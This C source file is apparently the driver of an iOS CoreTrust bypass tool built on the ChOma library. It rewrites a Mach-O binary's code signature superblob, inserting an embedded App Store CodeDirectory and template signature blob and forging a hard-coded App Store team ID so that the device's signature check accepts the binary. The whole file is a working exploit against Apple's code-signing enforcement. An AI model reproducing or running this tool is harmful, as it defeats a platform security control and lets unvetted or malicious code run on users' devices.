
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/Signing.h>
#include <choma/SignatureBlob.h>
#include <choma/SignOSSL.h>
#include <choma/CodeDirectory.h>
#include "AppStoreCodeDirectory.h"
#include "TemplateSignatureBlob.h"

#define APPSTORE_CERT_TEAM_ID "T8ALTGMVXN"

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    MachO *macho = fat_find_preferred_slice(fat);
    
    char *temp = strdup("/tmp/XXXXXX");
    mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    return temp;
}

int main(int argc, char *argv[]) {
    printf("CoreTrust bypass eta s0n!!\n");

    /*uint8_t *testData = malloc(0x300);
    memset(testData, 0x41, 0x300);
    MemoryStream *testStream = buffered_stream_init_from_buffer(testData, 0x300, BUFFERED_STREAM_FLAG_AUTO_EXPAND);

    memory_stream_expand(testStream, 0x100, 0x100);
    //memory_stream_trim(testStream, 0x100, 0x0);

    printf("size after trim: 0x%lx\n", memory_stream_get_size(testStream));

    uint8_t append[0x100];
    memset(append, 0x42, 0x100);
    memory_stream_write(testStream, memory_stream_get_size(testStream), 0x100, &append[0]);

    uint32_t dumpSize = memory_stream_get_size(testStream);
    char fullData[dumpSize];
    memory_stream_read(testStream, 0, dumpSize, fullData);
    FILE *fx = fopen("data/test.bin", "wb");
    fwrite(fullData, dumpSize, 1, fx);
    fclose(fx);
    return 0;*/


    if (argc < 2) {
        printf("Usage: %s <path to MachO file>\n", argv[0]);
        return -1;
    }

    // Make sure the last argument is the path to the FAT/MachO file
    struct stat fileStat;
    if (stat(argv[argc - 1], &fileStat) != 0 && argc > 1) {
        printf("Please ensure the last argument is the path to a FAT/MachO file.\n");
        return -1;
    }

    char *filePath = argv[1];
    char *machoPath = extract_preferred_slice(filePath);
    printf("extracted best slice to %s\n", machoPath);

    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;

    CS_SuperBlob *superblob = (CS_SuperBlob *)macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }
    uint64_t sizeOfCodeSignature = BIG_TO_HOST(superblob->length);

    FILE *fp = fopen("data/blob.orig", "wb");
    fwrite(superblob, BIG_TO_HOST(superblob->length), 1, fp);
    fclose(fp);

    DecodedSuperBlob *decodedSuperblob = superblob_decode(superblob);

    // Replace the first CodeDirectory with the one from the App Store
    DecodedBlob *blob = decodedSuperblob->firstBlob;
    if (blob->type != CSSLOT_CODEDIRECTORY) {
        printf("The first blob is not a CodeDirectory!\n");
        return -1;
    }

    bool hasTwoCodeDirectories = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES) != NULL;
    if (!hasTwoCodeDirectories) {
        // We need to insert the App Store CodeDirectory in the first slot and move the original one to the last slot
        DecodedBlob *firstCD = superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY);
        DecodedBlob *currentBlob = decodedSuperblob->firstBlob;
        while (currentBlob->next) {
            currentBlob = currentBlob->next;
        }
        currentBlob->next = malloc(sizeof(DecodedBlob));
        currentBlob->next->stream = firstCD->stream;
        currentBlob->next->type = CSSLOT_ALTERNATE_CODEDIRECTORIES;
        currentBlob->next->next = NULL;

    } else {
        // Don't free if we've moved the original CodeDirectory to the last slot
        memory_stream_free(blob->stream);
    }

    MemoryStream *newCDStream = buffered_stream_init_from_buffer(AppStoreCodeDirectory, AppStoreCodeDirectory_len, 0);
    blob->stream = newCDStream;

    /*
        App Store CodeDirectory
        Requirements
        Entitlements
        DER entitlements
        Actual CodeDirectory
        Signature blob
    */

    printf("Adding App Store CodeDirectory...\n");
    DecodedBlob *appStoreCDBlob = malloc(sizeof(DecodedBlob));
    appStoreCDBlob->type = CSSLOT_CODEDIRECTORY;
    appStoreCDBlob->stream = buffered_stream_init_from_buffer(AppStoreCodeDirectory, AppStoreCodeDirectory_len, 0);

    DecodedBlob *requirementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_REQUIREMENTS);

    DecodedBlob *entitlementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS);

    DecodedBlob *derEntitlementsBlob = superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS);

    DecodedBlob *actualCDBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES);

    DecodedBlob *signatureBlob = superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT);

    printf("Adding new signature blob...\n");
    if (signatureBlob != NULL) {
        memory_stream_free(superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT)->stream);
        superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT)->stream = buffered_stream_init_from_buffer(TemplateSignatureBlob, TemplateSignatureBlob_len, 0);
    } else {
        signatureBlob = malloc(sizeof(DecodedBlob));
        signatureBlob->type = CSSLOT_SIGNATURESLOT;
        signatureBlob->stream = buffered_stream_init_from_buffer(TemplateSignatureBlob, TemplateSignatureBlob_len, 0);
        signatureBlob->next = NULL;
        DecodedBlob *nextBlob = decodedSuperblob->firstBlob;
        while (nextBlob->next) {
            nextBlob = nextBlob->next;
        }
        nextBlob->next = signatureBlob;
    }

    const char *teamIDToSet = APPSTORE_CERT_TEAM_ID;
    size_t teamIDToSetSize = strlen(teamIDToSet)+1;

    if (actualCDBlob != NULL) {
        CS_CodeDirectory codeDir;
        memory_stream_read(actualCDBlob->stream, 0, sizeof(codeDir), &codeDir);
        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, BIG_TO_HOST_APPLIER);

        int32_t shift = 0;
        uint32_t initalTeamOffset = codeDir.teamOffset;

        // If there is already a TeamID, delete it
        if (initalTeamOffset != 0) {
            
            uint32_t existingTeamIDSize = 0;
            char *existingTeamID = NULL;
            memory_stream_read_string(actualCDBlob->stream, initalTeamOffset, &existingTeamID);
            existingTeamIDSize = strlen(existingTeamID)+1;
            free(existingTeamID);

            memory_stream_delete(actualCDBlob->stream, initalTeamOffset, existingTeamIDSize);
            shift -= existingTeamIDSize;
        }

        // Insert new TeamID
        if (codeDir.identOffset == 0) {
            printf("No identity found, that's bad.\n");
            return -1;
        }
        char *ident = NULL;
        memory_stream_read_string(actualCDBlob->stream, codeDir.identOffset, &ident);
        uint32_t newTeamOffset = codeDir.identOffset + strlen(ident) + 1;
        free(ident);
        memory_stream_insert(actualCDBlob->stream, newTeamOffset, teamIDToSetSize, teamIDToSet);
        shift += teamIDToSetSize;

        
        codeDir.teamOffset = newTeamOffset;

        // Offsets that point to after the TeamID have to be shifted
        if (codeDir.hashOffset != 0 && codeDir.hashOffset > initalTeamOffset) {
            codeDir.hashOffset += shift;
        }
        if (codeDir.scatterOffset != 0 && codeDir.scatterOffset > initalTeamOffset) {
            codeDir.scatterOffset += shift;
        }

        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, HOST_TO_BIG_APPLIER);
        memory_stream_write(actualCDBlob->stream, 0, sizeof(codeDir), &codeDir);
    }
    else {
        printf("Failed to locate actual CD blob.\n");
        return -1;
    }

    printf("Creating new superblob...\n");
    appStoreCDBlob->next = requirementsBlob;
    requirementsBlob->next = entitlementsBlob;
    entitlementsBlob->next = derEntitlementsBlob;
    derEntitlementsBlob->next = actualCDBlob;
    actualCDBlob->next = signatureBlob;
    signatureBlob->next = NULL;

    int ret = 0;
    CS_SuperBlob *encodedSuperblobUnsigned = superblob_encode(decodedSuperblob);
    printf("Updating load commands...\n");
    update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, sizeOfCodeSignature, memory_stream_get_size(macho->stream));
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    DecodedBlob *codeDirectoryBlob = superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    update_code_directory(macho, codeDirectoryBlob->stream);

    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Signature blob update FAILED!\n");
        return -1;
    }

    printf("Encoding superblob...\n");
    CS_SuperBlob *newSuperblob = superblob_encode(decodedSuperblob);

    // Write the new superblob to the file
    fp = fopen("data/blob.generated", "wb");
    fwrite(newSuperblob, BIG_TO_HOST(newSuperblob->length), 1, fp);
    fclose(fp);

    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    decoded_superblob_free(decodedSuperblob);
    free(superblob);
    free(newSuperblob);
    
    macho_free(macho);
    printf("Signed file is at %s! CoreTrust bypass eta now!!\n", machoPath);
    free(machoPath);
    return 0;
}
